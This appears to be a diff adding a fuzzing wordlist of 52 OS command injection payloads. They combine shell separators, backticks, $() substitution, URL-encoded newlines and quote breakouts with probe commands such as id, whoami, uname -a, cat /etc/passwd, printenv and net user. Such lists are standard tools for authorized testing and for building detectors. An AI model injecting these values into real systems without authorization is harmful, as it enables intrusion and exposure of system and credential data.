@@ -1,0 +1,52 @@
+;id
+|id
+||id
+&id
+&&id
+`id`
+$(id)
+;whoami
+|whoami
+||whoami
+&whoami
+&&whoami
+`whoami`
+$(whoami)
+;uname -a
+|uname -a
+;cat /etc/passwd
+;ls -la
+|ls -la
+;dir
+|dir
+;type C:\Windows\System32\drivers\etc\hosts
+%0aid
+%0awhoami
+%0als
+%0adir
+\nid
+\nwhoami
+;echo test123
+|echo test123
+;printenv
+;env
+;hostname
+|hostname
+;pwd
+|pwd
+;net user
+%0anet user
+;ipconfig
+|ipconfig
+;ifconfig
+|ifconfig
+;id;
+|id;
+;id||
+|id||
+'id'
+"id"
+';id;'
+";id;"
+';id'
+";id"
